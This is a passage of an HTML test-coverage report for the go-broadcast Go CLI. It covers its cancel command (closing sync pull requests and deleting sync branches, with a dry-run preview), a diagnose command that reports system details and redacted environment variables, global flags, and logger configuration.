        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to filter targets: %w", err)
        }</span>

        // Prepare summary
        <span class="cov0" title="0">summary := &amp;CancelSummary{
                TotalTargets: len(filteredTargets),
                Results:      make([]CancelResult, 0, len(filteredTargets)),
                DryRun:       globalFlags.DryRun,
        }

        // Process each target
        for _, targetState := range filteredTargets </span><span class="cov0" title="0">{
                result := processCancelTarget(ctx, ghClient, targetState)
                summary.Results = append(summary.Results, result)

                // Update counters
                if result.PRClosed </span><span class="cov0" title="0">{
                        summary.PRsClosed++
                }</span>
                <span class="cov0" title="0">if result.BranchDeleted </span><span class="cov0" title="0">{
                        summary.BranchesDeleted++
                }</span>
                <span class="cov0" title="0">if result.Error != "" </span><span class="cov0" title="0">{
                        summary.Errors++
                }</span>
        }

        // Sort results by repository name for consistent output
        <span class="cov0" title="0">sort.Slice(summary.Results, func(i, j int) bool </span><span class="cov0" title="0">{
                return summary.Results[i].Repository &lt; summary.Results[j].Repository
        }</span>)

        <span class="cov0" title="0">return summary, nil</span>
}

func filterTargets(s *state.State, targetRepos []string) ([]*state.TargetState, error) <span class="cov8" title="1">{
        if len(targetRepos) == 0 </span><span class="cov8" title="1">{
                // Return all targets
                targets := make([]*state.TargetState, 0, len(s.Targets))
                for _, target := range s.Targets </span><span class="cov8" title="1">{
                        // Only include targets with active syncs (open PRs or sync branches)
                        if len(target.OpenPRs) &gt; 0 || len(target.SyncBranches) &gt; 0 </span><span class="cov8" title="1">{
                                targets = append(targets, target)
                        }</span>
                }
                <span class="cov8" title="1">return targets, nil</span>
        }

        // Filter to specified repositories
        <span class="cov8" title="1">targets := make([]*state.TargetState, 0, len(targetRepos))
        for _, repo := range targetRepos </span><span class="cov8" title="1">{
                target, exists := s.Targets[repo]
                if !exists </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("%w: %q", ErrTargetNotFound, repo)
                }</span>

                // Only include if there are active syncs
                <span class="cov8" title="1">if len(target.OpenPRs) &gt; 0 || len(target.SyncBranches) &gt; 0 </span><span class="cov8" title="1">{
                        targets = append(targets, target)
                }</span>
        }

        <span class="cov8" title="1">return targets, nil</span>
}

func processCancelTarget(ctx context.Context, ghClient gh.Client, target *state.TargetState) CancelResult <span class="cov8" title="1">{
        result := CancelResult{
                Repository: target.Repo,
        }

        // Process open PRs - only handle the first one (most recent)
        if len(target.OpenPRs) &gt; 0 </span><span class="cov8" title="1">{
                pr := target.OpenPRs[0]

                if globalFlags.DryRun </span><span class="cov8" title="1">{
                        result.PRNumber = &amp;pr.Number
                        result.PRClosed = true // Would be closed
                }</span> else<span class="cov8" title="1"> {
                        // Generate comment
                        comment := generateCancelComment()
                        if cancelComment != "" </span><span class="cov8" title="1">{
                                comment = cancelComment
                        }</span>

                        // Close the PR
                        <span class="cov8" title="1">if err := ghClient.ClosePR(ctx, target.Repo, pr.Number, comment); err != nil </span><span class="cov8" title="1">{
                                result.Error = fmt.Sprintf("failed to close PR #%d: %v", pr.Number, err)
                                return result
                        }</span>

                        <span class="cov8" title="1">result.PRNumber = &amp;pr.Number
                        result.PRClosed = true</span>
                }
        }

        // Process sync branches
        <span class="cov8" title="1">if len(target.SyncBranches) &gt; 0 </span><span class="cov8" title="1">{
                // Find the most recent sync branch
                var mostRecent *state.SyncBranch
                for i := range target.SyncBranches </span><span class="cov8" title="1">{
                        branch := &amp;target.SyncBranches[i]
                        if branch.Metadata != nil </span><span class="cov8" title="1">{
                                if mostRecent == nil || branch.Metadata.Timestamp.After(mostRecent.Metadata.Timestamp) </span><span class="cov8" title="1">{
                                        mostRecent = branch
                                }</span>
                        }
                }

                <span class="cov8" title="1">if mostRecent != nil </span><span class="cov8" title="1">{
                        result.BranchName = mostRecent.Name

                        // Only delete if not keeping branches
                        if !cancelKeepBranches </span><span class="cov8" title="1">{
                                if globalFlags.DryRun </span><span class="cov8" title="1">{
                                        result.BranchDeleted = true // Would be deleted
                                }</span> else<span class="cov8" title="1"> {
                                        // Delete the branch
                                        if err := ghClient.DeleteBranch(ctx, target.Repo, mostRecent.Name); err != nil </span><span class="cov8" title="1">{
                                                // Don't fail the entire operation if branch deletion fails
                                                if result.Error == "" </span><span class="cov8" title="1">{
                                                        result.Error = fmt.Sprintf("failed to delete branch %s: %v", mostRecent.Name, err)
                                                }</span> else<span class="cov0" title="0"> {
                                                        result.Error += fmt.Sprintf("; failed to delete branch %s: %v", mostRecent.Name, err)
                                                }</span>
                                        } else<span class="cov8" title="1"> {
                                                result.BranchDeleted = true
                                        }</span>
                                }
                        }
                }
        }

        <span class="cov8" title="1">return result</span>
}

func generateCancelComment() string <span class="cov8" title="1">{
        return fmt.Sprintf(`üö´ **Sync Operation Canceled**

This sync operation has been canceled using go-broadcast cancel command.

- **Canceled at**: %s
- **Reason**: Manual cancellation via CLI

You can safely ignore this PR. If you need to re-sync, run the sync command again with your updated configuration.

---
*This comment was automatically generated by go-broadcast.*`, time.Now().Format(time.RFC3339))
}</span>

func outputCancelPreview(summary *CancelSummary) error <span class="cov8" title="1">{
        output.Warn("DRY-RUN MODE: No changes will be made")
        output.Info("")

        if summary.TotalTargets == 0 </span><span class="cov8" title="1">{
                output.Info("No active sync operations found to cancel")
                return nil
        }</span>

        <span class="cov8" title="1">output.Info(fmt.Sprintf("Would cancel sync operations for %d target(s):", summary.TotalTargets))
        output.Info("")

        for _, result := range summary.Results </span><span class="cov8" title="1">{
                output.Info(fmt.Sprintf("üì¶ %s", result.Repository))

                if result.PRNumber != nil </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  ‚úì Would close PR #%d", *result.PRNumber))
                }</span>

                <span class="cov8" title="1">if result.BranchName != "" &amp;&amp; !cancelKeepBranches </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  ‚úì Would delete branch: %s", result.BranchName))
                }</span> else<span class="cov8" title="1"> if result.BranchName != "" </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  ‚è∏ Would keep branch: %s", result.BranchName))
                }</span>

                <span class="cov8" title="1">if result.Error != "" </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  ‚úó Error: %s", result.Error))
                }</span>

                <span class="cov8" title="1">output.Info("")</span>
        }

        <span class="cov8" title="1">output.Info("Summary (would):")
        output.Info(fmt.Sprintf("  PRs to close: %d", summary.PRsClosed))
        if !cancelKeepBranches </span><span class="cov8" title="1">{
                output.Info(fmt.Sprintf("  Branches to delete: %d", summary.BranchesDeleted))
        }</span>

        <span class="cov8" title="1">return nil</span>
}

func outputCancelResults(summary *CancelSummary) error <span class="cov8" title="1">{
        if summary.TotalTargets == 0 </span><span class="cov8" title="1">{
                output.Info("No active sync operations found to cancel")
                return nil
        }</span>

        // Output JSON if requested
        <span class="cov8" title="1">if jsonOutput </span><span class="cov8" title="1">{
                encoder := json.NewEncoder(output.Stdout())
                encoder.SetIndent("", "  ")
                return encoder.Encode(summary)
        }</span>

        // Text output
        <span class="cov8" title="1">output.Info(fmt.Sprintf("Canceled sync operations for %d target(s):", summary.TotalTargets))
        output.Info("")

        for _, result := range summary.Results </span><span class="cov8" title="1">{
                output.Info(fmt.Sprintf("üì¶ %s", result.Repository))

                if result.PRClosed &amp;&amp; result.PRNumber != nil </span><span class="cov8" title="1">{
                        output.Success(fmt.Sprintf("  ‚úì Closed PR #%d", *result.PRNumber))
                }</span> else<span class="cov8" title="1"> if result.PRNumber != nil </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  ‚úó Failed to close PR #%d", *result.PRNumber))
                }</span>

                <span class="cov8" title="1">if result.BranchDeleted </span><span class="cov8" title="1">{
                        output.Success(fmt.Sprintf("  ‚úì Deleted branch: %s", result.BranchName))
                }</span> else<span class="cov8" title="1"> if result.BranchName != "" &amp;&amp; !cancelKeepBranches </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  ‚úó Failed to delete branch: %s", result.BranchName))
                }</span> else<span class="cov8" title="1"> if result.BranchName != "" </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  ‚è∏ Kept branch: %s", result.BranchName))
                }</span>

                <span class="cov8" title="1">if result.Error != "" </span><span class="cov8" title="1">{
                        output.Error(fmt.Sprintf("  Error: %s", result.Error))
                }</span>

                <span class="cov8" title="1">output.Info("")</span>
        }

        // Summary
        <span class="cov8" title="1">output.Info("Summary:")
        output.Success(fmt.Sprintf("  PRs closed: %d", summary.PRsClosed))

        if !cancelKeepBranches </span><span class="cov8" title="1">{
                output.Success(fmt.Sprintf("  Branches deleted: %d", summary.BranchesDeleted))
        }</span>

        <span class="cov8" title="1">if summary.Errors &gt; 0 </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("  Errors: %d", summary.Errors))
        }</span>

        <span class="cov8" title="1">if summary.Errors == 0 </span><span class="cov8" title="1">{
                output.Success("Cancel operation completed successfully!")
        }</span> else<span class="cov8" title="1"> {
                output.Warn("Cancel operation completed with some errors")
        }</span>

        <span class="cov8" title="1">return nil</span>
}
</pre>

		<pre class="file" id="file10" style="display: none">// Package cli provides command-line interface functionality for go-broadcast.
package cli

import (
        "context"
        "encoding/json"
        "fmt"
        "os"
        "os/exec"
        "runtime"
        "strings"
        "time"

        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
)

// DiagnosticInfo contains comprehensive system diagnostic information.
//
// This structure is designed to provide all the information needed for
// troubleshooting issues with go-broadcast, including system details,
// version information, and configuration status.
type DiagnosticInfo struct {
        Timestamp   time.Time             `json:"timestamp"`
        Version     DiagnosticVersionInfo `json:"version"`
        System      DiagnosticSystemInfo  `json:"system"`
        Environment map[string]string     `json:"environment"`
        GitVersion  string                `json:"git_version"`
        GHVersion   string                `json:"gh_cli_version"`
        Config      DiagnosticConfigInfo  `json:"config"`
}

// DiagnosticVersionInfo contains version details for go-broadcast diagnostics.
type DiagnosticVersionInfo struct {
        Version string `json:"version"`
        Commit  string `json:"commit,omitempty"`
        Date    string `json:"date,omitempty"`
        GoVer   string `json:"go_version"`
        Built   string `json:"built_by,omitempty"`
}

// DiagnosticSystemInfo contains system and runtime information.
type DiagnosticSystemInfo struct {
        OS       string `json:"os"`
        Arch     string `json:"arch"`
        NumCPU   int    `json:"num_cpu"`
        Hostname string `json:"hostname"`
        UserHome string `json:"user_home"`
}

// DiagnosticConfigInfo contains configuration file status information.
type DiagnosticConfigInfo struct {
        Path   string `json:"path"`
        Exists bool   `json:"exists"`
        Valid  bool   `json:"valid"`
        Error  string `json:"error,omitempty"`
}

// diagnoseCmd is the global diagnose command instance
//
//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var diagnoseCmd = &amp;cobra.Command{
        Use:   "diagnose",
        Short: "Collect diagnostic information",
        Long: `Collects comprehensive system information for troubleshooting.

This command gathers:
- System information (OS, architecture, CPU count)
- go-broadcast version and build details
- Git and GitHub CLI versions
- Environment variables (with sensitive data redacted)
- Configuration file status and validation

All output is in JSON format for easy analysis and sharing with support.`,
        Example: `  # Collect diagnostic information
  go-broadcast diagnose

  # Save diagnostics to file
  go-broadcast diagnose &gt; diagnostics.json`,
        RunE: runDiagnose,
}

// createDiagnoseCmdWithVerbose creates a diagnose command with verbose logging support.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Cobra command configured for diagnostic operations with verbose support
func createDiagnoseCmdWithVerbose(config *LogConfig) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "diagnose",
                Short: "Collect diagnostic information",
                Long: `Collects comprehensive system information for troubleshooting.

This command gathers:
- System information (OS, architecture, CPU count)
- go-broadcast version and build details
- Git and GitHub CLI versions
- Environment variables (with sensitive data redacted)
- Configuration file status and validation

All output is in JSON format for easy analysis and sharing with support.`,
                Example: `  # Collect diagnostic information
  go-broadcast diagnose

  # Save diagnostics to file
  go-broadcast diagnose &gt; diagnostics.json

  # Include diagnostics in verbose logging session
  go-broadcast diagnose &amp;&amp; go-broadcast sync -vvv`,
                RunE: createRunDiagnoseWithVerbose(config),
        }
}</span>

// createRunDiagnoseWithVerbose creates a diagnose run function with verbose logging support.
//
// This function creates a run function that collects comprehensive diagnostic
// information and outputs it in JSON format for troubleshooting purposes.
//
// Parameters:
// - config: LogConfig containing logging and debug configuration
//
// Returns:
// - Function that can be used as RunE for Cobra diagnose commands
func createRunDiagnoseWithVerbose(config *LogConfig) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Collect all diagnostic information
                info := &amp;DiagnosticInfo{
                        Timestamp:   time.Now(),
                        Version:     getVersionInfo(),
                        System:      getSystemInfo(),
                        Environment: collectEnvironment(ctx),
                        GitVersion:  getGitVersion(ctx),
                        GHVersion:   getGHCLIVersion(ctx),
                        Config:      getConfigInfo(ctx, config),
                }

                // Output as formatted JSON to stdout
                encoder := json.NewEncoder(os.Stdout)
                encoder.SetIndent("", "  ")
                if err := encoder.Encode(info); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to encode diagnostic information: %w", err)
                }</span>

                <span class="cov8" title="1">return nil</span>
        }
}

// getVersionInfo collects version information for go-broadcast.
//
// This function retrieves build-time version information including
// version number, commit hash, build date, and Go version.
//
// Returns:
// - DiagnosticVersionInfo structure with version details
func getVersionInfo() DiagnosticVersionInfo <span class="cov8" title="1">{
        // These variables are set at build time via ldflags
        // For now, we'll use runtime information
        return DiagnosticVersionInfo{
                Version: "dev", // Will be set via ldflags in production builds
                Commit:  "",    // Will be set via ldflags in production builds
                Date:    "",    // Will be set via ldflags in production builds
                GoVer:   runtime.Version(),
                Built:   "source", // Will be set via ldflags in production builds
        }
}</span>

// getSystemInfo collects system and runtime information.
//
// This function gathers basic system information including operating system,
// architecture, CPU count, hostname, and user home directory.
//
// Returns:
// - DiagnosticSystemInfo structure with system details
func getSystemInfo() DiagnosticSystemInfo <span class="cov8" title="1">{
        hostname, _ := os.Hostname()
        homeDir, _ := os.UserHomeDir()

        return DiagnosticSystemInfo{
                OS:       runtime.GOOS,
                Arch:     runtime.GOARCH,
                NumCPU:   runtime.NumCPU(),
                Hostname: hostname,
                UserHome: homeDir,
        }
}</span>

// collectEnvironment gathers relevant environment variables for diagnostics.
//
// This function collects specific environment variables that are relevant
// to go-broadcast operation while automatically redacting sensitive values
// like tokens and secrets.
//
// Parameters:
// - ctx: Context for cancellation control (currently unused but kept for future extension)
//
// Returns:
// - Map of environment variable names to their values (sensitive data redacted)
func collectEnvironment(_ context.Context) map[string]string <span class="cov8" title="1">{
        env := make(map[string]string)

        // List of environment variables relevant to go-broadcast
        relevantVars := []string{
                "PATH",
                "HOME",
                "USER",
                "SHELL",
                "GH_TOKEN",
                "GITHUB_TOKEN",
                "GO_BROADCAST_CONFIG",
                "NO_COLOR",
                "TERM",
                "CI",
                "GITHUB_ACTIONS",
                "GITHUB_WORKSPACE",
                "GITHUB_REPOSITORY",
                "RUNNER_OS",
        }

        for _, key := range relevantVars </span><span class="cov8" title="1">{
                value := os.Getenv(key)
                if value != "" </span><span class="cov8" title="1">{
                        // Redact sensitive values automatically
                        if isSensitiveEnvVar(key) </span><span class="cov8" title="1">{
                                if len(value) &gt; 8 </span><span class="cov8" title="1">{
                                        value = value[:4] + "***REDACTED***"
                                }</span> else<span class="cov8" title="1"> {
                                        value = "***REDACTED***"
                                }</span>
                        }
                        <span class="cov8" title="1">env[key] = value</span>
                }
        }

        <span class="cov8" title="1">return env</span>
}

// isSensitiveEnvVar checks if an environment variable contains sensitive data.
//
// Parameters:
// - key: Environment variable name to check
//
// Returns:
// - true if the variable likely contains sensitive data
func isSensitiveEnvVar(key string) bool <span class="cov8" title="1">{
        sensitivePatterns := []string{
                "TOKEN",
                "SECRET",
                "KEY",
                "PASSWORD",
                "PASS",
        }

        keyUpper := strings.ToUpper(key)
        for _, pattern := range sensitivePatterns </span><span class="cov8" title="1">{
                if strings.Contains(keyUpper, pattern) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// getGitVersion retrieves the Git version information.
//
// This function executes 'git --version' to determine the installed
// Git version, which is important for troubleshooting git-related issues.
//
// Parameters:
// - ctx: Context for cancellation and timeout control
//
// Returns:
// - Git version string or error description
func getGitVersion(ctx context.Context) string <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "git", "--version")
        output, err := cmd.Output()
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Sprintf("error: %v", err)
        }</span>
        <span class="cov8" title="1">return strings.TrimSpace(string(output))</span>
}

// getGHCLIVersion retrieves the GitHub CLI version information.
//
// This function executes 'gh --version' to determine the installed
// GitHub CLI version, which is essential for API operations.
//
// Parameters:
// - ctx: Context for cancellation and timeout control
//
// Returns:
// - GitHub CLI version string or error description
func getGHCLIVersion(ctx context.Context) string <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, "gh", "--version")
        output, err := cmd.Output()
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Sprintf("error: %v", err)
        }</span>

        // Extract first line which contains the main version info
        <span class="cov8" title="1">lines := strings.Split(string(output), "\n")
        if len(lines) &gt; 0 </span><span class="cov8" title="1">{
                return strings.TrimSpace(lines[0])
        }</span>
        <span class="cov0" title="0">return "unknown"</span>
}

// getConfigInfo analyzes the configuration file status.
//
// This function checks if the configuration file exists and attempts
// to validate it, providing diagnostic information about any issues.
//
// Parameters:
// - ctx: Context for cancellation control
// - logConfig: LogConfig containing the config file path
//
// Returns:
// - DiagnosticConfigInfo structure with configuration file status
func getConfigInfo(ctx context.Context, logConfig *LogConfig) DiagnosticConfigInfo <span class="cov8" title="1">{
        info := DiagnosticConfigInfo{
                Path:   logConfig.ConfigFile,
                Exists: false,
                Valid:  false,
        }

        // Check if file exists
        if _, err := os.Stat(info.Path); err == nil </span><span class="cov8" title="1">{
                info.Exists = true

                // Try to load and validate configuration
                cfg, loadErr := config.Load(info.Path)
                if loadErr != nil </span><span class="cov8" title="1">{
                        info.Error = fmt.Sprintf("load error: %v", loadErr)
                        return info
                }</span>

                // Attempt validation
                <span class="cov8" title="1">if validationErr := cfg.ValidateWithLogging(ctx, logConfig); validationErr != nil </span><span class="cov0" title="0">{
                        info.Error = fmt.Sprintf("validation error: %v", validationErr)
                        return info
                }</span>

                <span class="cov8" title="1">info.Valid = true</span>
        } else<span class="cov8" title="1"> {
                info.Error = fmt.Sprintf("file not found: %v", err)
        }</span>

        <span class="cov8" title="1">return info</span>
}

// runDiagnose is the global diagnose command run function.
//
// This function collects diagnostic information using the global flags
// and outputs it in JSON format for troubleshooting purposes.
//
// Parameters:
// - cmd: Cobra command being executed
// - args: Command line arguments (unused)
//
// Returns:
// - Error if diagnosis fails
func runDiagnose(cmd *cobra.Command, _ []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()

        // Create a LogConfig from global flags
        logConfig := &amp;LogConfig{
                ConfigFile: globalFlags.ConfigFile,
                LogLevel:   globalFlags.LogLevel,
                DryRun:     globalFlags.DryRun,
                LogFormat:  "text", // Default format for global version
        }

        // Collect all diagnostic information
        info := &amp;DiagnosticInfo{
                Timestamp:   time.Now(),
                Version:     getVersionInfo(),
                System:      getSystemInfo(),
                Environment: collectEnvironment(ctx),
                GitVersion:  getGitVersion(ctx),
                GHVersion:   getGHCLIVersion(ctx),
                Config:      getConfigInfo(ctx, logConfig),
        }

        // Output as formatted JSON to stdout
        encoder := json.NewEncoder(os.Stdout)
        encoder.SetIndent("", "  ")
        if err := encoder.Encode(info); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to encode diagnostic information: %w", err)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// createDiagnoseCmd creates an isolated diagnose command with the given flags.
//
// This function creates a diagnose command that uses the legacy Flags structure
// for compatibility with the isolated command pattern.
//
// Parameters:
// - flags: Flags containing basic CLI configuration
//
// Returns:
// - Cobra command configured for diagnostic operations
func createDiagnoseCmd(flags *Flags) *cobra.Command <span class="cov8" title="1">{
        return &amp;cobra.Command{
                Use:   "diagnose",
                Short: "Collect diagnostic information",
                Long: `Collects comprehensive system information for troubleshooting.

This command gathers:
- System information (OS, architecture, CPU count)
- go-broadcast version and build details
- Git and GitHub CLI versions
- Environment variables (with sensitive data redacted)
- Configuration file status and validation

All output is in JSON format for easy analysis and sharing with support.`,
                Example: `  # Collect diagnostic information
  go-broadcast diagnose

  # Save diagnostics to file
  go-broadcast diagnose &gt; diagnostics.json`,
                RunE: createRunDiagnose(flags),
        }
}</span>

// createRunDiagnose creates a diagnose run function with the given flags.
//
// This function creates a run function that collects diagnostic information
// using the legacy Flags structure for isolated command execution.
//
// Parameters:
// - flags: Flags containing basic CLI configuration
//
// Returns:
// - Function that can be used as RunE for Cobra diagnose commands
func createRunDiagnose(flags *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, _ []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Create a LogConfig from the provided flags
                logConfig := &amp;LogConfig{
                        ConfigFile: flags.ConfigFile,
                        LogLevel:   flags.LogLevel,
                        DryRun:     flags.DryRun,
                        LogFormat:  "text", // Default format for isolated version
                }

                // Collect all diagnostic information
                info := &amp;DiagnosticInfo{
                        Timestamp:   time.Now(),
                        Version:     getVersionInfo(),
                        System:      getSystemInfo(),
                        Environment: collectEnvironment(ctx),
                        GitVersion:  getGitVersion(ctx),
                        GHVersion:   getGHCLIVersion(ctx),
                        Config:      getConfigInfo(ctx, logConfig),
                }

                // Output as formatted JSON to stdout
                encoder := json.NewEncoder(os.Stdout)
                encoder.SetIndent("", "  ")
                if err := encoder.Encode(info); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to encode diagnostic information: %w", err)
                }</span>

                <span class="cov8" title="1">return nil</span>
        }
}
</pre>

		<pre class="file" id="file11" style="display: none">// Package cli provides command-line interface functionality for go-broadcast.
//
// This package implements the CLI commands, flags, and logging configuration
// used throughout the application. It is designed to provide intuitive
// debugging capabilities and flexible logging output.
//
// Key features include:
// - Verbose flag support (-v, -vv, -vvv) for increasing log detail
// - Component-specific debug flags for targeted troubleshooting
// - Multiple output formats (text and JSON) for different use cases
// - Dependency injection pattern for configuration management
//
// The package follows Go conventions by avoiding global state and using
// dependency injection for all configuration and logging setup.
package cli

import "github.com/mrz1836/go-broadcast/internal/logging"

// LogConfig holds all logging and CLI configuration.
//
// This configuration is passed via dependency injection throughout the
// application to avoid global state and enable better testing isolation.
type LogConfig = logging.LogConfig

// DebugFlags contains component-specific debug flags for targeted troubleshooting.
//
// Each flag enables detailed debugging for a specific component or operation,
// allowing users to focus on particular areas without overwhelming log output.
type DebugFlags = logging.DebugFlags

// Flags contains all global flags for the CLI (legacy support)
type Flags struct {
        ConfigFile  string
        DryRun      bool
        LogLevel    string
        GroupFilter []string // Groups to sync (by name or ID)
        SkipGroups  []string // Groups to skip during sync
}

// globalFlags is the singleton instance of flags
//
//nolint:gochecknoglobals // CLI flags need to be accessible across command functions
var globalFlags = &amp;Flags{
        ConfigFile: "sync.yaml",
        LogLevel:   "info",
}

// GetConfigFile returns the config file path
func GetConfigFile() string <span class="cov8" title="1">{
        if globalFlags == nil </span><span class="cov8" title="1">{
                return "sync.yaml" // Default value
        }</span>
        <span class="cov8" title="1">return globalFlags.ConfigFile</span>
}

// IsDryRun returns whether dry-run mode is enabled
func IsDryRun() bool <span class="cov8" title="1">{
        if globalFlags == nil </span><span class="cov8" title="1">{
                return false // Default value
        }</span>
        <span class="cov8" title="1">return globalFlags.DryRun</span>
}

// SetFlags updates the global flags
func SetFlags(f *Flags) <span class="cov8" title="1">{
        globalFlags = f
}</span>

// ResetGlobalFlags resets the global flags to their default values
// This is primarily used for testing to ensure clean state between tests
func ResetGlobalFlags() <span class="cov8" title="1">{
        globalFlags.ConfigFile = "sync.yaml"
        globalFlags.DryRun = false
        globalFlags.LogLevel = "info"
}</span>
</pre>

		<pre class="file" id="file12" style="display: none">// Package cli provides logging configuration and trace level support for go-broadcast.
//
// This file implements the LoggerService which provides verbose logging capabilities
// including trace level support beyond standard logrus levels and component-specific
// debug flag handling.
//
// Key features include:
// - Custom trace level implementation below debug level
// - Context-aware logging configuration based on verbose flags
// - Automatic caller information for deep debugging (-vvv)
// - Component-specific debug flag integration
//
// The LoggerService follows dependency injection pattern and requires context
// to be passed through all operations for proper cancellation support.
package cli

import (
        "context"
        "fmt"
        "path/filepath"
        "runtime"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/logging"
)

// TraceLevel uses the standard logrus TraceLevel for very detailed logging
const TraceLevel = logrus.TraceLevel

// LoggerService provides logging configuration and trace level support.
//
// This service manages the mapping of verbose flags to appropriate log levels
// and configures logrus with custom hooks for trace level support.
type LoggerService struct {
        config *LogConfig
}

// NewLoggerService creates a new logger service with the given configuration.
//
// Parameters:
// - config: Logging configuration containing verbose and debug settings
//
// Returns:
// - LoggerService instance configured with the provided settings
func NewLoggerService(config *LogConfig) *LoggerService <span class="cov8" title="1">{
        return &amp;LoggerService{
                config: config,
        }
}</span>

// TraceHook implements a custom logrus hook for trace level support.
//
// This hook allows logging at a level below debug by intercepting entries
// at the custom trace level and converting them to debug level entries
// with a [TRACE] prefix for easy identification.
type TraceHook struct {
        Enabled bool
}

// Levels returns the log levels this hook should fire for.
//
// Returns:
// - Slice of log levels, including the custom trace level when enabled
func (h *TraceHook) Levels() []logrus.Level <span class="cov8" title="1">{
        if h.Enabled </span><span class="cov8" title="1">{
                return []logrus.Level{TraceLevel}
        }</span>
        <span class="cov8" title="1">return []logrus.Level{}</span>
}

// Fire processes log entries at the trace level.
//
// This method converts trace level entries to debug level entries with
// a [TRACE] prefix to distinguish them from regular debug entries.
//
// Parameters:
// - entry: The log entry to process
//
// Returns:
// - Error if processing fails (always returns nil in current implementation)
func (h *TraceHook) Fire(entry *logrus.Entry) error <span class="cov8" title="1">{
        if entry.Level &lt;= TraceLevel </span><span class="cov8" title="1">{
                entry.Level = logrus.DebugLevel
                entry.Message = "[TRACE] " + entry.Message
        }</span>
        <span class="cov8" title="1">return nil</span>
}

// ConfigureLogger sets up logrus with the provided configuration.
//
// This function performs the following steps:
// - Maps verbose count to appropriate log levels
// - Configures trace level support when needed
// - Sets up custom formatting for different verbose levels
// - Enables caller information for maximum verbosity (-vvv)
//
// Parameters:
// - ctx: Context for cancellation control
//
// Returns:
// - Error if configuration fails
//
// Side Effects:
// - Modifies global logrus configuration
// - Adds custom hooks for trace level support
// - Configures formatters based on verbose level
func (s *LoggerService) ConfigureLogger(ctx context.Context) error <span class="cov8" title="1">{
        // Check for context cancellation
        select </span>{
        case &lt;-ctx.Done():<span class="cov8" title="1">
                return fmt.Errorf("logger configuration canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        // Validate configuration first
        <span class="cov8" title="1">level, err := s.mapVerboseLevelWithError()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("invalid log configuration: %w", err)
        }</span>

        // Set the log level
        <span class="cov8" title="1">logrus.SetLevel(level)

        // Add custom trace level support if needed
        if s.config.Verbose &gt;= 2 </span><span class="cov8" title="1">{
                logrus.AddHook(&amp;TraceHook{
                        Enabled: true,
                })
        }</span>

        // Add redaction hook for automatic sensitive data protection
        <span class="cov8" title="1">redactionService := logging.NewRedactionService()
        redactionHook := redactionService.CreateHook()
        logrus.AddHook(redactionHook)

        // Configure formatter based on format preference and verbose level
        if s.config.LogFormat == "json" || s.config.JSONOutput </span><span class="cov8" title="1">{
                // Use structured JSON formatter
                logrus.SetFormatter(logging.NewStructuredFormatter())
        }</span> else<span class="cov8" title="1"> if s.config.Verbose &gt;= 3 </span><span class="cov8" title="1">{
                // Maximum verbosity: include caller information with text format
                logrus.SetReportCaller(true)
                logrus.SetFormatter(&amp;logrus.TextFormatter{
                        DisableColors:    false,
                        FullTimestamp:    true,
                        TimestampFormat:  "15:04:05.000",
                        PadLevelText:     true,
                        QuoteEmptyFields: true,
                        CallerPrettyfier: func(f *runtime.Frame) (string, string) </span><span class="cov8" title="1">{
                                return "", fmt.Sprintf("%s:%d", filepath.Base(f.File), f.Line)
                        }</span>,
                })
        } else<span class="cov8" title="1"> {
                // Standard text formatting for lower verbose levels
                logrus.SetFormatter(&amp;logrus.TextFormatter{
                        DisableColors:    false,
                        FullTimestamp:    true,
                        TimestampFormat:  "15:04:05",
                        PadLevelText:     true,
                        QuoteEmptyFields: true,
                })
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// IsTraceEnabled returns whether trace level logging is enabled.
//
// Returns:
// - True if trace level logging is active based on configuration
func (s *LoggerService) IsTraceEnabled() bool <span class="cov8" title="1">{
        return s.config.Verbose &gt;= 2
}</span>

// IsDebugEnabled returns whether debug level logging is enabled.
//
// Returns:
// - True if debug level logging is active based on configuration
func (s *LoggerService) IsDebugEnabled() bool <span class="cov8" title="1">{
        return s.config.Verbose &gt;= 1 || s.mapVerboseToLevel() &lt;= logrus.DebugLevel
}</span>

// GetDebugFlags returns the component-specific debug flags.
//
// Returns:
// - DebugFlags struct containing all component debug settings
func (s *LoggerService) GetDebugFlags() DebugFlags <span class="cov8" title="1">{
        return s.config.Debug
}</span>

// mapVerboseToLevel maps verbose count to appropriate logrus levels.
//
// This function implements the verbose flag mapping according to the plan:
// - No flag or -v 0: INFO level (existing behavior)
// - -v: DEBUG level
// - -vv: TRACE level (standard logrus)
// - -vvv+: TRACE level with caller info
//
// If LogLevel is explicitly set, verbose flags override it when present.
//
// Returns:
// - Appropriate logrus.Level based on configuration
func (s *LoggerService) mapVerboseToLevel() logrus.Level <span class="cov8" title="1">{
        level, _ := s.mapVerboseLevelWithError()
        return level
